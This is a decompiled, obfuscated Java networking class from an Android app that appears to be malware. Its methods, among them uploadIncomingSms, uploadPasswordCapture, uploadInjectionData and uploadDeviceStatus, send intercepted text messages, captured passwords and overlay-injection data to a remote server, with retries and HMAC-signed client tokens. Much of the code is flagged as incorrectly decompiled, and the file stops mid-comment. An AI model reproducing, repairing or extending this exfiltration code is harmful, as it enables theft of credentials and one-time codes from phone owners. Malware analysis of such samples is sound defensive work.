package com.storm.safe.rock.network;

import android.content.Context;
import java.io.IOException;
import java.net.ConnectException;
import java.net.SocketTimeoutException;
import java.net.UnknownHostException;
import java.nio.charset.Charset;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.TimeUnit;
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import kotlin.Result;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.ContinuationImpl;
import kotlin.jvm.internal.Ref$LongRef;
import kotlin.jvm.internal.Ref$ObjectRef;
import kotlinx.coroutines.AbstractC0780a0;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import okhttp3.ResponseBody;
import org.json.JSONObject;
import p000.AbstractC0003a2;
import p000.AbstractC0134bh;
import p000.AbstractC0577hd;
import p000.AbstractC0765ko;
import p000.AbstractC1262tj;
import p000.ExecutorC1158qw;
import p000.b81;
import p000.f40;
import p000.h10;
import p000.kg1;
import p000.kj1;
import p000.m21;
import p000.t60;
import p000.tz0;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.network.a1 */
/* loaded from: classes2.dex */
public final class C0268a1 {

    /* renamed from: a6 */
    public static final f40 f52275a6 = new f40(null);

    /* renamed from: a7 */
    public static volatile C0268a1 f52276a7;

    /* renamed from: a0 */
    public final Context f52277a0;

    /* renamed from: a1 */
    public String f52278a1 = "";

    /* renamed from: a2 */
    public String f52279a2 = "";

    /* renamed from: a3 */
    public String f52280a3 = "";

    /* renamed from: a4 */
    public final OkHttpClient f52281a4;

    /* renamed from: a5 */
    public final MediaType f52282a5;

    public C0268a1(Context context) {
        this.f52277a0 = context;
        OkHttpClient.Builder builder = new OkHttpClient.Builder();
        TimeUnit timeUnit = TimeUnit.SECONDS;
        this.f52281a4 = builder.connectTimeout(10L, timeUnit).readTimeout(15L, timeUnit).writeTimeout(15L, timeUnit).retryOnConnectionFailure(true).build();
        this.f52282a5 = MediaType.Companion.get("application/json; charset=utf-8");
    }

    /* JADX WARN: Can't wrap try/catch for region: R(10:132|35|(8:37|(0)|44|45|46|147|47|48)|43|44|45|46|147|47|48) */
    /* JADX WARN: Can't wrap try/catch for region: R(6:85|134|86|144|87|88) */
    /* JADX WARN: Code restructure failed: missing block: B:49:0x00e3, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:51:0x00e6, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:53:0x00e9, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:55:0x00ec, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:73:0x015f, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:74:0x0160, code lost:
    
        r1 = r19;
        r4 = r20;
     */
    /* JADX WARN: Code restructure failed: missing block: B:75:0x0166, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:76:0x0167, code lost:
    
        r1 = r19;
        r4 = r20;
     */
    /* JADX WARN: Code restructure failed: missing block: B:77:0x016d, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:78:0x016e, code lost:
    
        r1 = r19;
        r4 = r20;
     */
    /* JADX WARN: Code restructure failed: missing block: B:79:0x0174, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:80:0x0175, code lost:
    
        r1 = r19;
        r4 = r20;
     */
    /* JADX WARN: Path cross not found for [B:37:0x00c3, B:43:0x00d4], limit reached: 142 */
    /* JADX WARN: Removed duplicated region for block: B:115:0x0281  */
    /* JADX WARN: Removed duplicated region for block: B:121:0x02ad  */
    /* JADX WARN: Removed duplicated region for block: B:123:0x02ba  */
    /* JADX WARN: Removed duplicated region for block: B:125:0x02c8  */
    /* JADX WARN: Removed duplicated region for block: B:132:0x00bd A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:149:0x008f A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:62:0x00f9  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:118:0x0299 -> B:119:0x029f). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:123:0x02ba -> B:124:0x02be). Please report as a decompilation issue!!! */
    /* renamed from: a0 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211370a0(Request request, int i, long j, ContinuationImpl continuationImpl) {
        HttpManager$executeRequest$1 httpManager$executeRequest$1;
        C0268a1 c0268a1;
        Ref$ObjectRef ref$ObjectRef;
        C0268a1 c0268a12;
        Ref$LongRef ref$LongRef;
        int i2;
        int i3;
        HttpManager$executeRequest$1 httpManager$executeRequest$12;
        Request request2;
        Request request3;
        int i4;
        int i5;
        int i6;
        Exception e;
        int i7;
        UnknownHostException e2;
        SocketTimeoutException e3;
        ConnectException e4;
        Response response;
        Throwable th;
        String strString;
        if (continuationImpl instanceof HttpManager$executeRequest$1) {
            httpManager$executeRequest$1 = (HttpManager$executeRequest$1) continuationImpl;
            int i8 = httpManager$executeRequest$1.f52200a9;
            if ((i8 & Integer.MIN_VALUE) != 0) {
                httpManager$executeRequest$1.f52200a9 = i8 - Integer.MIN_VALUE;
                c0268a1 = this;
            } else {
                c0268a1 = this;
                httpManager$executeRequest$1 = new HttpManager$executeRequest$1(c0268a1, continuationImpl);
            }
        }
        Object objM213696a7 = httpManager$executeRequest$1.f52198a7;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i9 = httpManager$executeRequest$1.f52200a9;
        int i10 = 1;
        if (i9 == 0) {
            kg1.m213544f4(objM213696a7);
            Ref$ObjectRef ref$ObjectRef2 = new Ref$ObjectRef();
            Ref$LongRef ref$LongRef2 = new Ref$LongRef();
            ref$LongRef2.f57625a0 = j;
            ref$ObjectRef = ref$ObjectRef2;
            c0268a12 = c0268a1;
            ref$LongRef = ref$LongRef2;
            i2 = 0;
            i3 = i;
            httpManager$executeRequest$12 = httpManager$executeRequest$1;
            request2 = request;
            if (i2 >= i3) {
            }
        } else if (i9 == 1) {
            i6 = httpManager$executeRequest$1.f52197a6;
            i5 = httpManager$executeRequest$1.f52196a5;
            i4 = httpManager$executeRequest$1.f52195a4;
            ref$LongRef = httpManager$executeRequest$1.f52194a3;
            ref$ObjectRef = httpManager$executeRequest$1.f52193a2;
            request3 = httpManager$executeRequest$1.f52192a1;
            c0268a12 = httpManager$executeRequest$1.f52191a0;
            try {
                kg1.m213544f4(objM213696a7);
            } catch (ConnectException e5) {
                e4 = e5;
                i7 = i10;
                t60.m214726f4("HttpManager", "🔌 连接失败，尝试 " + (i6 + 1) + "/" + i4);
                ref$ObjectRef.f57626a0 = e4;
                if (i6 >= i4 - 1) {
                }
            } catch (SocketTimeoutException e6) {
                e3 = e6;
                i7 = i10;
                t60.m214726f4("HttpManager", "⏱️ 请求超时，尝试 " + (i6 + 1) + "/" + i4);
                ref$ObjectRef.f57626a0 = e3;
                if (i6 >= i4 - 1) {
                }
            } catch (UnknownHostException e7) {
                e2 = e7;
                i7 = i10;
                t60.m214726f4("HttpManager", "🌐 DNS 解析失败，尝试 " + (i6 + 1) + "/" + i4);
                ref$ObjectRef.f57626a0 = e2;
                if (i6 >= i4 - 1) {
                }
            } catch (Exception e8) {
                e = e8;
                i7 = i10;
                tz0.m214807a7("HTTP 请求异常: ", e.getMessage(), "HttpManager");
                ref$ObjectRef.f57626a0 = e;
                if (i6 >= i4 - 1) {
                }
            }
            response = (Response) objM213696a7;
            if (!response.isSuccessful()) {
            }
            if (i6 >= i4 - 1) {
            }
        } else {
            if (i9 != 2) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            int i11 = httpManager$executeRequest$1.f52196a5;
            int i12 = httpManager$executeRequest$1.f52195a4;
            Ref$LongRef ref$LongRef3 = httpManager$executeRequest$1.f52194a3;
            Ref$ObjectRef ref$ObjectRef3 = httpManager$executeRequest$1.f52193a2;
            Request request4 = httpManager$executeRequest$1.f52192a1;
            C0268a1 c0268a13 = httpManager$executeRequest$1.f52191a0;
            kg1.m213544f4(objM213696a7);
            char c = 2;
            i7 = 1;
            long j2 = (long) (ref$LongRef3.f57625a0 * 1.5d);
            if (j2 > 5000) {
                j2 = 5000;
            }
            ref$LongRef3.f57625a0 = j2;
            int i13 = i12;
            i5 = i11;
            i3 = i13;
            HttpManager$executeRequest$1 httpManager$executeRequest$13 = httpManager$executeRequest$1;
            request2 = request4;
            c0268a12 = c0268a13;
            ref$ObjectRef = ref$ObjectRef3;
            ref$LongRef = ref$LongRef3;
            i2 = i5 + 1;
            i10 = i7;
            httpManager$executeRequest$12 = httpManager$executeRequest$13;
            if (i2 >= i3) {
                try {
                } catch (ConnectException e9) {
                    e4 = e9;
                    i7 = i10;
                    request3 = request2;
                    httpManager$executeRequest$1 = httpManager$executeRequest$12;
                    i5 = i2;
                    i4 = i3;
                    i6 = i5;
                    t60.m214726f4("HttpManager", "🔌 连接失败，尝试 " + (i6 + 1) + "/" + i4);
                    ref$ObjectRef.f57626a0 = e4;
                    if (i6 >= i4 - 1) {
                    }
                } catch (SocketTimeoutException e10) {
                    e3 = e10;
                    i7 = i10;
                    request3 = request2;
                    httpManager$executeRequest$1 = httpManager$executeRequest$12;
                    i5 = i2;
                    i4 = i3;
                    i6 = i5;
                    t60.m214726f4("HttpManager", "⏱️ 请求超时，尝试 " + (i6 + 1) + "/" + i4);
                    ref$ObjectRef.f57626a0 = e3;
                    if (i6 >= i4 - 1) {
                    }
                } catch (UnknownHostException e11) {
                    e2 = e11;
                    i7 = i10;
                    request3 = request2;
                    httpManager$executeRequest$1 = httpManager$executeRequest$12;
                    i5 = i2;
                    i4 = i3;
                    i6 = i5;
                    t60.m214726f4("HttpManager", "🌐 DNS 解析失败，尝试 " + (i6 + 1) + "/" + i4);
                    ref$ObjectRef.f57626a0 = e2;
                    if (i6 >= i4 - 1) {
                    }
                } catch (Exception e12) {
                    e = e12;
                    i7 = i10;
                    request3 = request2;
                    httpManager$executeRequest$1 = httpManager$executeRequest$12;
                    i5 = i2;
                    i4 = i3;
                    i6 = i5;
                    tz0.m214807a7("HTTP 请求异常: ", e.getMessage(), "HttpManager");
                    ref$ObjectRef.f57626a0 = e;
                    if (i6 >= i4 - 1) {
                    }
                }
                ExecutorC1158qw executorC1158qw = AbstractC1262tj.f60234a1;
                HttpManager$executeRequest$2$result$1 httpManager$executeRequest$2$result$1 = new HttpManager$executeRequest$2$result$1(c0268a12, request2, null);
                httpManager$executeRequest$12.f52191a0 = c0268a12;
                httpManager$executeRequest$12.f52192a1 = request2;
                httpManager$executeRequest$12.f52193a2 = ref$ObjectRef;
                httpManager$executeRequest$12.f52194a3 = ref$LongRef;
                httpManager$executeRequest$12.f52195a4 = i3;
                httpManager$executeRequest$12.f52196a5 = i2;
                httpManager$executeRequest$12.f52197a6 = i2;
                httpManager$executeRequest$12.f52200a9 = i10;
                objM213696a7 = AbstractC0780a0.m213696a7(executorC1158qw, httpManager$executeRequest$2$result$1, httpManager$executeRequest$12);
                if (objM213696a7 != coroutineSingletons) {
                    try {
                        request3 = request2;
                        httpManager$executeRequest$1 = httpManager$executeRequest$12;
                        i5 = i2;
                        i4 = i3;
                        i6 = i5;
                        try {
                        } catch (ConnectException e13) {
                            e4 = e13;
                            i7 = i10;
                            t60.m214726f4("HttpManager", "🔌 连接失败，尝试 " + (i6 + 1) + "/" + i4);
                            ref$ObjectRef.f57626a0 = e4;
                            if (i6 >= i4 - 1) {
                            }
                        } catch (SocketTimeoutException e14) {
                            e3 = e14;
                            i7 = i10;
                            t60.m214726f4("HttpManager", "⏱️ 请求超时，尝试 " + (i6 + 1) + "/" + i4);
                            ref$ObjectRef.f57626a0 = e3;
                            if (i6 >= i4 - 1) {
                            }
                        } catch (UnknownHostException e15) {
                            e2 = e15;
                            i7 = i10;
                            t60.m214726f4("HttpManager", "🌐 DNS 解析失败，尝试 " + (i6 + 1) + "/" + i4);
                            ref$ObjectRef.f57626a0 = e2;
                            if (i6 >= i4 - 1) {
                            }
                        } catch (Exception e16) {
                            e = e16;
                            i7 = i10;
                            tz0.m214807a7("HTTP 请求异常: ", e.getMessage(), "HttpManager");
                            ref$ObjectRef.f57626a0 = e;
                            if (i6 >= i4 - 1) {
                            }
                        }
                    } catch (Throwable th2) {
                        th = th2;
                    }
                    response = (Response) objM213696a7;
                    if (!response.isSuccessful()) {
                        try {
                            ResponseBody responseBodyBody = response.body();
                            if (responseBodyBody != null) {
                                strString = responseBodyBody.string();
                                if (strString == null) {
                                }
                                int i14 = Result.f57558a1;
                                i7 = i10;
                                JSONObject jSONObject = new JSONObject(strString);
                                response.close();
                                return jSONObject;
                            }
                            strString = "{}";
                            int i142 = Result.f57558a1;
                            i7 = i10;
                            JSONObject jSONObject2 = new JSONObject(strString);
                            response.close();
                            return jSONObject2;
                        } catch (Throwable th3) {
                            th = th3;
                            th = th;
                            try {
                                throw th;
                            } catch (Throwable th4) {
                                kj1.m213559a6(response, th);
                                throw th4;
                            }
                        }
                    }
                    i7 = i10;
                    try {
                        int iCode = response.code();
                        HttpManager$executeRequest$1 httpManager$executeRequest$14 = httpManager$executeRequest$1;
                        if (400 <= iCode && iCode < 500) {
                            try {
                                int iCode2 = response.code();
                                String strMessage = response.message();
                                StringBuilder sb = new StringBuilder();
                                sb.append("HTTP 客户端错误: ");
                                sb.append(iCode2);
                                sb.append(" ");
                                sb.append(strMessage);
                                t60.m214726f4("HttpManager", sb.toString());
                                int i15 = Result.f57558a1;
                                Result.Failure failureM213507a7 = kg1.m213507a7(new IOException("HTTP " + response.code() + ": " + response.message()));
                                response.close();
                                return failureM213507a7;
                            } catch (Throwable th5) {
                                th = th5;
                                th = th;
                                throw th;
                            }
                        }
                        int i16 = i6;
                        try {
                            t60.m214726f4("HttpManager", "HTTP 服务器错误: " + response.code() + "，尝试 " + (i16 + 1) + "/" + i4);
                            ref$ObjectRef.f57626a0 = new IOException("HTTP " + response.code() + ": " + response.message());
                            response.close();
                            httpManager$executeRequest$1 = httpManager$executeRequest$14;
                            i6 = i16;
                        } catch (Throwable th6) {
                            th = th6;
                        }
                        th = th6;
                    } catch (Throwable th7) {
                        th = th7;
                        th = th;
                        throw th;
                    }
                    th = th;
                    throw th;
                    if (i6 >= i4 - 1) {
                        long j3 = ref$LongRef.f57625a0;
                        httpManager$executeRequest$1.f52191a0 = c0268a12;
                        httpManager$executeRequest$1.f52192a1 = request3;
                        httpManager$executeRequest$1.f52193a2 = ref$ObjectRef;
                        httpManager$executeRequest$1.f52194a3 = ref$LongRef;
                        httpManager$executeRequest$1.f52195a4 = i4;
                        httpManager$executeRequest$1.f52196a5 = i5;
                        c = 2;
                        httpManager$executeRequest$1.f52200a9 = 2;
                        if (b81.m210571b1(j3, httpManager$executeRequest$1) != coroutineSingletons) {
                            i11 = i5;
                            i12 = i4;
                            ref$LongRef3 = ref$LongRef;
                            ref$ObjectRef3 = ref$ObjectRef;
                            request4 = request3;
                            c0268a13 = c0268a12;
                            long j22 = (long) (ref$LongRef3.f57625a0 * 1.5d);
                            if (j22 > 5000) {
                            }
                            ref$LongRef3.f57625a0 = j22;
                            int i132 = i12;
                            i5 = i11;
                            i3 = i132;
                            HttpManager$executeRequest$1 httpManager$executeRequest$132 = httpManager$executeRequest$1;
                            request2 = request4;
                            c0268a12 = c0268a13;
                            ref$ObjectRef = ref$ObjectRef3;
                            ref$LongRef = ref$LongRef3;
                            i2 = i5 + 1;
                            i10 = i7;
                            httpManager$executeRequest$12 = httpManager$executeRequest$132;
                            if (i2 >= i3) {
                                int i17 = Result.f57558a1;
                                Throwable iOException = (Exception) ref$ObjectRef.f57626a0;
                                if (iOException == null) {
                                    iOException = new IOException(AbstractC0003a2.m30b1("Unknown error after ", i3, " retries"));
                                }
                                return kg1.m213507a7(iOException);
                            }
                        }
                    } else {
                        c = 2;
                        httpManager$executeRequest$132 = httpManager$executeRequest$1;
                        i3 = i4;
                        request2 = request3;
                        i2 = i5 + 1;
                        i10 = i7;
                        httpManager$executeRequest$12 = httpManager$executeRequest$132;
                        if (i2 >= i3) {
                        }
                    }
                }
                return coroutineSingletons;
            }
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:8:0x0014  */
    /* renamed from: a1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211371a1(String str, JSONObject jSONObject, boolean z, ContinuationImpl continuationImpl) {
        HttpManager$post$1 httpManager$post$1;
        if (continuationImpl instanceof HttpManager$post$1) {
            httpManager$post$1 = (HttpManager$post$1) continuationImpl;
            int i = httpManager$post$1.f52206a2;
            if ((i & Integer.MIN_VALUE) != 0) {
                httpManager$post$1.f52206a2 = i - Integer.MIN_VALUE;
            } else {
                httpManager$post$1 = new HttpManager$post$1(this, continuationImpl);
            }
        }
        HttpManager$post$1 httpManager$post$12 = httpManager$post$1;
        Object obj = httpManager$post$12.f52204a0;
        Object obj2 = CoroutineSingletons.f57606a0;
        int i2 = httpManager$post$12.f52206a2;
        if (i2 != 0) {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            kg1.m213544f4(obj);
            return ((Result) obj).f57559a0;
        }
        kg1.m213544f4(obj);
        Request.Builder builderUrl = new Request.Builder().url(this.f52278a1 + str);
        RequestBody.Companion companion = RequestBody.Companion;
        String string = jSONObject.toString();
        t60.m214694b5(string, "data.toString()");
        Request.Builder builderPost = builderUrl.post(companion.create(string, this.f52282a5));
        if (z) {
            builderPost.addHeader("X-Client-ID", this.f52279a2);
            String strM213937e5 = "";
            if (this.f52279a2.length() != 0) {
                String strM213603a1 = this.f52280a3;
                if (strM213603a1.length() == 0) {
                    String str2 = AbstractC0765ko.f57555a0;
                    strM213603a1 = AbstractC0765ko.m213603a1(this.f52277a0);
                    if (strM213603a1.length() > 0) {
                        this.f52280a3 = strM213603a1;
                        t60.m214714d6("HttpManager", "✅ 从配置文件补充 deviceKeySalt");
                    }
                }
                if (strM213603a1.length() == 0) {
                    t60.m214726f4("HttpManager", "⚠️ deviceKeySalt 为空，API认证将失败");
                } else {
                    try {
                        Mac mac = Mac.getInstance("HmacSHA256");
                        Charset charset = AbstractC0577hd.f56650a0;
                        byte[] bytes = strM213603a1.getBytes(charset);
                        t60.m214694b5(bytes, "this as java.lang.String).getBytes(charset)");
                        mac.init(new SecretKeySpec(bytes, "HmacSHA256"));
                        byte[] bytes2 = this.f52279a2.getBytes(charset);
                        t60.m214694b5(bytes2, "this as java.lang.String).getBytes(charset)");
                        byte[] bArrDoFinal = mac.doFinal(bytes2);
                        t60.m214694b5(bArrDoFinal, "hash");
                        strM213937e5 = m21.m213937e5(32, AbstractC0134bh.m210726e9(bArrDoFinal, new h10() { // from class: com.storm.safe.rock.network.HttpManager$generateDeviceKey$1
                            @Override // p000.h10
                            public final Object invoke(Object obj3) {
                                return String.format("%02x", Arrays.copyOf(new Object[]{Byte.valueOf(((Number) obj3).byteValue())}, 1));
                            }
                        }));
                    } catch (Exception e) {
                        t60.m214705c6("HttpManager", "生成设备密钥失败", e);
                    }
                }
            }
            builderPost.addHeader("X-Client-Token", strM213937e5);
        }
        Request requestBuild = builderPost.build();
        httpManager$post$12.f52206a2 = 1;
        Object objM211370a0 = m211370a0(requestBuild, 3, 1000L, httpManager$post$12);
        return objM211370a0 == obj2 ? obj2 : objM211370a0;
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: a2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211372a2(JSONObject jSONObject, ContinuationImpl continuationImpl) {
        HttpManager$register$1 httpManager$register$1;
        if (continuationImpl instanceof HttpManager$register$1) {
            httpManager$register$1 = (HttpManager$register$1) continuationImpl;
            int i = httpManager$register$1.f52209a2;
            if ((i & Integer.MIN_VALUE) != 0) {
                httpManager$register$1.f52209a2 = i - Integer.MIN_VALUE;
            } else {
                httpManager$register$1 = new HttpManager$register$1(this, continuationImpl);
            }
        }
        Object objM213696a7 = httpManager$register$1.f52207a0;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = httpManager$register$1.f52209a2;
        if (i2 == 0) {
            kg1.m213544f4(objM213696a7);
            ExecutorC1158qw executorC1158qw = AbstractC1262tj.f60234a1;
            HttpManager$register$2 httpManager$register$2 = new HttpManager$register$2(null, this, jSONObject);
            httpManager$register$1.f52209a2 = 1;
            objM213696a7 = AbstractC0780a0.m213696a7(executorC1158qw, httpManager$register$2, httpManager$register$1);
            if (objM213696a7 == coroutineSingletons) {
                return coroutineSingletons;
            }
        } else {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            kg1.m213544f4(objM213696a7);
        }
        return ((Result) objM213696a7).f57559a0;
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: a3 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211373a3(String str, JSONObject jSONObject, ContinuationImpl continuationImpl) {
        HttpManager$uploadDeviceStatus$1 httpManager$uploadDeviceStatus$1;
        if (continuationImpl instanceof HttpManager$uploadDeviceStatus$1) {
            httpManager$uploadDeviceStatus$1 = (HttpManager$uploadDeviceStatus$1) continuationImpl;
            int i = httpManager$uploadDeviceStatus$1.f52215a2;
            if ((i & Integer.MIN_VALUE) != 0) {
                httpManager$uploadDeviceStatus$1.f52215a2 = i - Integer.MIN_VALUE;
            } else {
                httpManager$uploadDeviceStatus$1 = new HttpManager$uploadDeviceStatus$1(this, continuationImpl);
            }
        }
        Object objM213696a7 = httpManager$uploadDeviceStatus$1.f52213a0;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = httpManager$uploadDeviceStatus$1.f52215a2;
        if (i2 == 0) {
            kg1.m213544f4(objM213696a7);
            ExecutorC1158qw executorC1158qw = AbstractC1262tj.f60234a1;
            HttpManager$uploadDeviceStatus$2 httpManager$uploadDeviceStatus$2 = new HttpManager$uploadDeviceStatus$2(this, str, jSONObject, null);
            httpManager$uploadDeviceStatus$1.f52215a2 = 1;
            objM213696a7 = AbstractC0780a0.m213696a7(executorC1158qw, httpManager$uploadDeviceStatus$2, httpManager$uploadDeviceStatus$1);
            if (objM213696a7 == coroutineSingletons) {
                return coroutineSingletons;
            }
        } else {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            kg1.m213544f4(objM213696a7);
        }
        return ((Result) objM213696a7).f57559a0;
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0015  */
    /* renamed from: a4 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211374a4(String str, String str2, String str3, long j, ContinuationImpl continuationImpl) {
        HttpManager$uploadIncomingSms$1 httpManager$uploadIncomingSms$1;
        if (continuationImpl instanceof HttpManager$uploadIncomingSms$1) {
            httpManager$uploadIncomingSms$1 = (HttpManager$uploadIncomingSms$1) continuationImpl;
            int i = httpManager$uploadIncomingSms$1.f52222a2;
            if ((i & Integer.MIN_VALUE) != 0) {
                httpManager$uploadIncomingSms$1.f52222a2 = i - Integer.MIN_VALUE;
            } else {
                httpManager$uploadIncomingSms$1 = new HttpManager$uploadIncomingSms$1(this, continuationImpl);
            }
        }
        Object objM213696a7 = httpManager$uploadIncomingSms$1.f52220a0;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = httpManager$uploadIncomingSms$1.f52222a2;
        if (i2 == 0) {
            kg1.m213544f4(objM213696a7);
            ExecutorC1158qw executorC1158qw = AbstractC1262tj.f60234a1;
            HttpManager$uploadIncomingSms$2 httpManager$uploadIncomingSms$2 = new HttpManager$uploadIncomingSms$2(this, str, str2, str3, j, null);
            httpManager$uploadIncomingSms$1.f52222a2 = 1;
            objM213696a7 = AbstractC0780a0.m213696a7(executorC1158qw, httpManager$uploadIncomingSms$2, httpManager$uploadIncomingSms$1);
            if (objM213696a7 == coroutineSingletons) {
                return coroutineSingletons;
            }
        } else {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            kg1.m213544f4(objM213696a7);
        }
        return ((Result) objM213696a7).f57559a0;
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: a5 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211375a5(JSONObject jSONObject, ContinuationImpl continuationImpl) {
        HttpManager$uploadInjectionData$1 httpManager$uploadInjectionData$1;
        if (continuationImpl instanceof HttpManager$uploadInjectionData$1) {
            httpManager$uploadInjectionData$1 = (HttpManager$uploadInjectionData$1) continuationImpl;
            int i = httpManager$uploadInjectionData$1.f52231a2;
            if ((i & Integer.MIN_VALUE) != 0) {
                httpManager$uploadInjectionData$1.f52231a2 = i - Integer.MIN_VALUE;
            } else {
                httpManager$uploadInjectionData$1 = new HttpManager$uploadInjectionData$1(this, continuationImpl);
            }
        }
        Object objM213696a7 = httpManager$uploadInjectionData$1.f52229a0;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = httpManager$uploadInjectionData$1.f52231a2;
        if (i2 == 0) {
            kg1.m213544f4(objM213696a7);
            ExecutorC1158qw executorC1158qw = AbstractC1262tj.f60234a1;
            HttpManager$uploadInjectionData$2 httpManager$uploadInjectionData$2 = new HttpManager$uploadInjectionData$2(null, this, jSONObject);
            httpManager$uploadInjectionData$1.f52231a2 = 1;
            objM213696a7 = AbstractC0780a0.m213696a7(executorC1158qw, httpManager$uploadInjectionData$2, httpManager$uploadInjectionData$1);
            if (objM213696a7 == coroutineSingletons) {
                return coroutineSingletons;
            }
        } else {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            kg1.m213544f4(objM213696a7);
        }
        return ((Result) objM213696a7).f57559a0;
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: a6 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211376a6(List list, ContinuationImpl continuationImpl) throws Throwable {
        HttpManager$uploadLogs$1 httpManager$uploadLogs$1;
        if (continuationImpl instanceof HttpManager$uploadLogs$1) {
            httpManager$uploadLogs$1 = (HttpManager$uploadLogs$1) continuationImpl;
            int i = httpManager$uploadLogs$1.f52237a2;
            if ((i & Integer.MIN_VALUE) != 0) {
                httpManager$uploadLogs$1.f52237a2 = i - Integer.MIN_VALUE;
            } else {
                httpManager$uploadLogs$1 = new HttpManager$uploadLogs$1(this, continuationImpl);
            }
        }
        Object objM213696a7 = httpManager$uploadLogs$1.f52235a0;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = httpManager$uploadLogs$1.f52237a2;
        if (i2 == 0) {
            kg1.m213544f4(objM213696a7);
            ExecutorC1158qw executorC1158qw = AbstractC1262tj.f60234a1;
            HttpManager$uploadLogs$2 httpManager$uploadLogs$2 = new HttpManager$uploadLogs$2(this, list, null);
            httpManager$uploadLogs$1.f52237a2 = 1;
            objM213696a7 = AbstractC0780a0.m213696a7(executorC1158qw, httpManager$uploadLogs$2, httpManager$uploadLogs$1);
            if (objM213696a7 == coroutineSingletons) {
                return coroutineSingletons;
            }
        } else {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            kg1.m213544f4(objM213696a7);
        }
        return ((Result) objM213696a7).f57559a0;
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0015  */
    /* renamed from: a7 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211377a7(String str, String str2, String str3, String str4, String str5, int i, ContinuationImpl continuationImpl) throws Throwable {
        HttpManager$uploadPasswordCapture$1 httpManager$uploadPasswordCapture$1;
        if (continuationImpl instanceof HttpManager$uploadPasswordCapture$1) {
            httpManager$uploadPasswordCapture$1 = (HttpManager$uploadPasswordCapture$1) continuationImpl;
            int i2 = httpManager$uploadPasswordCapture$1.f52243a2;
            if ((i2 & Integer.MIN_VALUE) != 0) {
                httpManager$uploadPasswordCapture$1.f52243a2 = i2 - Integer.MIN_VALUE;
            } else {
                httpManager$uploadPasswordCapture$1 = new HttpManager$uploadPasswordCapture$1(this, continuationImpl);
            }
        }
        Object objM213696a7 = httpManager$uploadPasswordCapture$1.f52241a0;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i3 = httpManager$uploadPasswordCapture$1.f52243a2;
        if (i3 == 0) {
            kg1.m213544f4(objM213696a7);
            ExecutorC1158qw executorC1158qw = AbstractC1262tj.f60234a1;
            HttpManager$uploadPasswordCapture$2 httpManager$uploadPasswordCapture$2 = new HttpManager$uploadPasswordCapture$2(this, str, str2, str3, str4, str5, i, null);
            httpManager$uploadPasswordCapture$1.f52243a2 = 1;
            objM213696a7 = AbstractC0780a0.m213696a7(executorC1158qw, httpManager$uploadPasswordCapture$2, httpManager$uploadPasswordCapture$1);
            if (objM213696a7 == coroutineSingletons) {
                return coroutineSingletons;
            }
        } else {
            if (i3 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            kg1.m213544f4(objM213696a7);
        }
        return ((Result) objM213696a7).f57559a0;
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: a8 */
    /*
